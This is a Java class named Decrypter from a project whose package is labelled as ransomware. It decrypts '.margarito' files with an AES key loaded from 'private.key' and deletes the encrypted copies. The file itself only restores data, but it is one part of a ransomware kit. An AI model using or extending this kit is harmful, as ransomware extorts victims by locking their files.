package com.margarito.ransomware;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class Decrypter extends FileProcessor {
    private SecretKey secretKey;

    public Decrypter(String rootDirectory) throws Exception {
        super(rootDirectory);
        this.secretKey = loadKey();
    }

    private SecretKey loadKey() throws Exception {
        byte[] keyBytes = Files.readAllBytes(Paths.get("private.key"));
        return new SecretKeySpec(keyBytes, "AES");
    }

    @Override
    public void processFiles(List<String> filePaths) {
        filePaths.forEach(filePath -> {
            try {
                String encryptedFilePath = filePath + ".margarito";
                byte[] encryptedBytes = Files.readAllBytes(Paths.get(encryptedFilePath));
                Cipher cipher = Cipher.getInstance("AES");
                cipher.init(Cipher.DECRYPT_MODE, secretKey);
                byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
                Files.write(Paths.get(filePath), decryptedBytes);
                new File(encryptedFilePath).delete();
            } catch (Exception e) {
                System.err.println("Decryption failed for: " + filePath);
                e.printStackTrace();
            }
        });
    }
}
